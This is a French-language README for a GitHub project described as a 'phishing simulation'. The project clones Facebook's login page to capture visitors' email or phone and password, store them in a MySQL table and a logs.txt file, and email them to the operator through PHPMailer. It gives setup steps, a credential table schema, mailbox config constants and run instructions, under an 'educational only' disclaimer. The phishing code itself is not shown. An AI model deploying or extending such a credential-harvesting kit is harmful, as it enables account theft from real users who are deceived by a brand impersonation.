# Simulation de Phishing

## 📌 Description
Ce projet est une **simulation de phishing** de la page de connexion de Facebook permettant de capturer les identifiants d'utilisateurs et de les enregistrer dans une base de données, un fichier, et de les envoyer par e-mail via **PHPMailer**.

⚠️ **Ce projet est uniquement à des fins éducatives et de test de sécurité. Toute utilisation illégale est strictement interdite.**

---

## 🚀 Installation
### 1️⃣ **Pré-requis**
- PHP 7.4 ou supérieur
- MySQL
- Serveur local (**XAMPP, WAMP, LAMP, MAMP**)
- Composer (optionnel pour PHPMailer)

### 2️⃣ **Cloner le dépôt**
```bash
git clone https://github.com/Ltk-Mxz/fish.git
cd fish
```

### 3️⃣ **Configuration de la base de données**
1. **Créer la base de données** dans MySQL :
```sql
CREATE DATABASE phishing_simulation_db;
```
2. **Importer la table** `target` :
```sql
CREATE TABLE target (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email_or_tel VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### 4️⃣ **Configurer les paramètres du projet**
Configure les paramètres suivants:
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', '');
define('DB_NAME', 'phishing_simulation_db');

define('EMAIL_TO', 'ton_email@email.com'); // Email pour recevoir les logs
define('EMAIL_FROM', 'ton_email@gmail.com');
define('EMAIL_PASS', 'ton_mot_de_passe');
```

### 5️⃣ **Installation de PHPMailer**
Si tu l’as téléchargé manuellement, assure-toi que le dossier `PHPMailer/` contient bien :
```
PHPMailer/
├── src/
│    ├── PHPMailer.php
│    ├── SMTP.php
│    └── Exception.php
```
Sinon, installe-le via **Composer** :
```bash
composer require phpmailer/phpmailer
```

---

## 📤 Utilisation
1. **Lancer le serveur local** :
```bash
php -S localhost:8000
```
2. **Accéder à la page de connexion factice** :
   - Ouvre **http://localhost:8000/** dans un navigateur.
3. **Tester l’enregistrement des identifiants** :
   - Entre un e-mail/téléphone et un mot de passe.
   - Les informations seront enregistrées en **base de données**, dans un **fichier `logs.txt`**, et envoyées par **e-mail**.

---

## 🔧 Dépannage
**Problème d’envoi d’e-mail ?**
  ```
- Active l’accès pour **les applications moins sécurisées** sur Gmail :
  [Créer un mot de passe d'application](https://myaccount.google.com/apppasswords)

---

## ⚠️ Avertissement
**Ce projet est destiné uniquement aux tests de cybersécurité et aux formations.**
Toute utilisation illégale engage la responsabilité de l'utilisateur.

---

## 📜 Licence
MIT License - Tu peux utiliser ce projet librement en respectant les lois en vigueur.

---

## 👨‍💻 Auteur
[Ltk-Mxz]